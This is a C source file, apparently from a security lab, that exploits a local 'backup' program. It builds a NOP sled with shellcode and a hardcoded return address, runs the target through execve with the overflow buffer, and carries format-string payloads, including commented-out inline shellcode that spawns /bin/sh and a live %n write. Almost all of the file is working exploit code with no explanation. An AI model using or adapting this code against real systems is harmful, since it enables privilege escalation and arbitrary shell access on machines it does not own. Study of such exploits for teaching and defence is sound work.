/* exploit buffer overflow */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdarg.h>
#include "/usr/local/src/shellcode.h"

//#define TARGET "/home/alice/backup"
//#define TARGET "/home/carol/backup"
//#define TARGET "/home/david/backup"
#define TARGET "/home/eve/backup"

#define NOP 0x90
#define BUFFER_SIZE 128
#define EGG_SIZE 250

int main(void) {
	char *buff, *ptr, *args[3], *env[1], *temp;
	int i, buffsize = BUFFER_SIZE;
	long *addr_ptr, ret;

	ret = 0xffbfdc10;

	if (!(buff = malloc(EGG_SIZE))) {
		printf ("Can't allocate memory.\n");
	}

	if (!(temp = malloc(EGG_SIZE))) {
		printf ("Can't allocate memory.\n");
	}


	ptr = buff;
	addr_ptr = (long *)ptr;
	for (i=0; i<EGG_SIZE; i+=4) {
		*(addr_ptr++) = ret;
	}

	for (i=0; i<EGG_SIZE-130; i++) {
		buff[i] = NOP;
	}

	ptr = buff + ((EGG_SIZE-130) - strlen(shellcode)/2);
	for (i=0; i<strlen(shellcode); i++) {
		*(ptr++) = shellcode[i];
	}

	buff[buffsize-1] = '\0';

	/*
	temp[0] = NOP;
	for (i=1; i<EGG_SIZE; i++) {
		temp[i] = buff[i-1];
	}
	temp[EGG_SIZE-1] = '\0';
	*/

	// args[0] = "%90d\x04\xdc\xbf\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
	// \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
	// \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
	// \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b
	// \x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd
	// \x80\xe8\xdc\xff\xff\xff/bin/sh";
	// args[0] = "-AAAAAAAABBBBBBBB %x %x %x %x %x %x %x %x %x %x";
	args[0] = "\x2c\xa7\x04\x08AAAA.%10$x%n";
	// args[1] = "backup";
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;

	if (execve(TARGET, args, env) < 0) 
		fprintf(stderr, "execve failed.\n");
	exit(0);
}